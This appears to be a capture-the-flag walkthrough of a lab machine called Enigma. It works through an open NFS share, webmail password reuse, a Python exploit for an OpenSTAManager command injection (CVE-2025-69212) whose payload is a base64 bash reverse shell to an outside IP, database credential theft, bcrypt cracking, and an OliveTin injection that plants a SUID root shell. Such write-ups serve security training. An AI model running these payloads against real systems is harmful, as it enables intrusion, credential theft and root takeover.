# Enigma

## Recon

### Full Port Scan

```shell
sudo nmap -sT --min-rate 10000 -p- 10.129.7.87 -oA nmapscan/ports
```

```
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
110/tcp   open  pop3
111/tcp   open  rpcbind
143/tcp   open  imap
993/tcp   open  imaps
995/tcp   open  pop3s
33981/tcp open  unknown
36947/tcp open  unknown
55923/tcp open  unknown
59587/tcp open  unknown
60895/tcp open  unknown
```

### Service Detection

Extract the open ports into a variable:

```shell
ports=$(grep open nmapscan/ports.nmap | awk -F'/' '{print $1}' | paste -sd ',')
sudo nmap -sT -sC -sV -O -p $ports 10.129.7.87 -oA nmapscan/detail
```

Key findings:

```
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp   open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://enigma.htb/
110/tcp  open  pop3    Dovecot pop3d
111/tcp  open  rpcbind 2-4 (RPC #100000)
|   100003  3,4  2049/tcp  nfs
143/tcp  open  imap    Dovecot imapd
993/995  open  ssl     Dovecot
```

`rpcinfo` shows **NFS** exported on 2049. Port 80 redirects to `enigma.htb`:

```shell
echo "10.129.7.87 enigma.htb" | sudo tee -a /etc/hosts
```

## Foothold Part 1: NFS Export

NFS is often left world-readable with no authentication. List the exports:

```shell
showmount -e enigma.htb
```

```
/srv/nfs/onboarding *
```

The `*` means any host can mount it. Mount it and look inside:

```shell
sudo mkdir -p /mnt/nfs
sudo mount -t nfs enigma.htb:/srv/nfs/onboarding /mnt/nfs -o nolock
ls -la /mnt/nfs
```

It contains a single file `New_Employee_Access.pdf`. Copy it out.

![](assets/Pasted%20image%2020260628073900.png)

The onboarding document references the webmail host and a default credential. Add the mail vhost to `/etc/hosts`:

```shell
echo "10.129.7.87 mail001.enigma.htb" | sudo tee -a /etc/hosts
```

## Foothold Part 2: Webmail and Password Reuse

Log into the webmail as `kevin` / `Enigma2024!`. There is an email from Sarah.

![](assets/Pasted%20image%2020260628144231.png)

Test the obvious password reuse: the same `Enigma2024!` works for `sarah` as well. Sarah's mailbox reveals a new internal application and another set of credentials.

![](assets/Pasted%20image%2020260628144349.png)

The new app is **OpenSTAManager**, version **2.9.8**.

## Foothold Part 3: OpenSTAManager Command Injection (CVE-2025-69212)

OpenSTAManager 2.9.8 is vulnerable to **CVE-2025-69212**, an authenticated OS command injection in its P 7 M (signed electronic-invoice) handling.

The root cause: when decoding a `.p7m` file, the app runs `openssl smime -verify -in "$file" ...` and passes the user-controlled filename straight into PHP's `exec()` with no sanitization. The filename comes from entries inside an uploaded ZIP, which we fully control. By closing the quote around `$file` with `"`, we can append our own shell command. One caveat: PHP's `ZipArchive` splits filenames on `/`, so the injected command must not contain a slash; base 64-encoding the payload and decoding it at runtime sidesteps that.

The payload builds a ZIP whose internal filename both terminates the openssl argument and injects a base 64-decoded reverse shell, while still ending in `.p7m` so the vulnerable decode branch is reached:

```shell
import zipfile, requests

import base64
b64 = base64.b64encode(b'bash -i >& /dev/tcp/10.10.16.152/4444 0>&1').decode()
cmd = f'echo {b64}|base64 -d|bash'

filename = f'invoice.p7m";{cmd};echo ".p7m'

with zipfile.ZipFile('/tmp/test.zip', 'w') as zf:
    zf.writestr(filename, b'PLACEHOLDER')

r = requests.post(
    'http://support_001.enigma.htb/plugins/importFE_ZIP/actions.php',
    cookies={'PHPSESSID': 'mjf67slumuhfq04rfvo69ju64s'},
    files={'blob1': ('test.zip', open('/tmp/test.zip','rb'), 'application/zip')},
    data={'op': 'save', 'id_module': '14', 'id_plugin': '48'}
)
print(r.status_code, r.text[:300])
```

Start a listener first:

```shell
rlwrap ncat -nvlp 4444
```

Running the script gives a shell as `www-data`.

## Enumeration: Database Credentials and User Hash

Read the application config for database credentials:

```shell
cat ~/html/openstamanager/config.inc.php
```

```
$db_host = 'localhost';
$db_username = 'brollin';
$db_password = 'Fri3nds@9099';
$db_name = 'openstamanager';
```

Identify the real login users on the box:

```shell
cat /etc/passwd | grep -E "sh$"
```

```
root:x:0:0:root:/root:/bin/bash
haris:x:1000:1000:,,,:/home/haris:/bin/bash
```

So `haris` is the user we want. Dump the application's user table:

```shell
mysql -u brollin -p'Fri3nds@9099'
```

```mysql
use openstamanager;
select id, username, password from zz_users;
```

```
+----+----------+--------------------------------------------------------------+
| id | username | password                                                     |
+----+----------+--------------------------------------------------------------+
|  1 | admin    | $2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu |
|  2 | haris    | $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC |
+----+----------+--------------------------------------------------------------+
```

The `$2y$` prefix is bcrypt. Crack Haris's hash:

```shell
echo '$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC' > haris.hash
hashcat -m 3200 haris.hash /usr/share/wordlists/rockyou.txt.gz
```

The password is `bestfriends`. `su haris` and get the user flag.

![](assets/Pasted%20image%2020260629034433.png)

## Privilege Escalation: OliveTin Command Injection

Look for internal services:

```shell
ss -tunlp
```

```
tcp   LISTEN 0      4096       127.0.0.1:1337       0.0.0.0:*
```

The response is the web UI of **OliveTin**, a tool that exposes predefined shell commands as buttons on a web interface. Check who runs it:

```shell
curl -i http://127.0.0.1:1337/
```

The response is the web UI of **OliveTin**, a tool that exposes predefined shell commands as buttons on a web interface. Check who runs it:

```shell
ps aux | grep -i olivetin
```

```
root        1520  0.0  0.4 1239888 16540 ?       Ssl  06:39   0:00 /usr/local/bin/OliveTin
```

It runs as **root**, so any command OliveTin executes runs as root. Read its config:

```shell
cat /etc/OliveTin/config.yaml
```

Among the actions is one whose shell command interpolates user-supplied arguments directly:

```
- title: Backup Database
  id: backup_database
  icon: "⛁"
  shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
  popupOnStart: execution-dialog
  arguments:
    - name: db_user
      type: ascii_identifier
      default: backup_svc
    - name: db_pass
      type: password
    - name: db_name
      type: ascii_identifier
      default: production
```

The `{{ db_pass }}` value is placed inside single quotes in the shell command. If we pass a value that closes the quote, we can inject our own command, executed as root. OliveTin's REST API lets us trigger the action directly, and the default policy allows guests to execute actions.

### Confirming the Injection

Set `db_pass` to `'; id > /tmp/olivetin-test; #'`, which closes the quote, runs `id`, and comments out the rest:

```shell
cat >/tmp/request.json <<'EOF'
{
  "actionId": "backup_database",
  "arguments": [
    {
      "name": "db_user",
      "value": "backup_svc"
    },
    {
      "name": "db_pass",
      "value": "'; id > /tmp/olivetin-test; #'"
    },
    {
      "name": "db_name",
      "value": "production"
    }
  ]
}
EOF

curl -sS -X POST -H 'Content-Type: application/json' --data-binary @/tmp/request.json http://127.0.0.1:1337/api/StartActionAndWait
```

```json
{
  "actionTitle": "Backup Database",
  "executionStarted": true,
  "executionFinished": true,
  "bindingId": "backup_database"
}
```

Check the result:

```shell
cat /tmp/olivetin-test
uid=0(root) gid=0(root) groups=0(root)
```

The command ran as root.

### Getting Root

Swap the payload to make a SUID copy of bash:

```shell
cat >/tmp/request.json <<'EOF'
{
  "actionId": "backup_database",
  "arguments": [
    {
      "name": "db_user",
      "value": "backup_svc"
    },
    {
      "name": "db_pass",
      "value": "'; cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash; #'"
    },
    {
      "name": "db_name",
      "value": "production"
    }
  ]
}
EOF

curl -sS -X POST -H 'Content-Type: application/json' --data-binary @/tmp/request.json http://127.0.0.1:1337/api/StartActionAndWait
```

`/tmp/rootbash` is now owned by root with the SUID bit set. Run it with `-p` to keep the elevated privileges:

```shell
/tmp/rootbash -p
```

![](assets/Pasted%20image%2020260629043142.png)

## Summary

- **Foothold:** An unauthenticated NFS export (`/srv/nfs/onboarding`) leaks an onboarding PDF with a default webmail credential.
- **Password reuse:** `kevin`'s password also works for `sarah`, whose mailbox points to an internal OpenSTAManager instance plus credentials.
- **RCE:** OpenSTAManager 2.9.8 command injection (CVE-2025-69212) via a malicious `.p7m` filename inside an uploaded ZIP gives a `www-data` shell.
- **User:** The app config exposes DB creds; the `zz_users` table yields Haris's bcrypt hash, which cracks to `bestfriends`.
- **Privesc:** A root-run OliveTin instance on 127.0.0.1:1337 exposes a `Backup Database` action that interpolates user input into a shell command. Inject through the `db_pass` argument via the REST API to run commands as root and drop a SUID bash.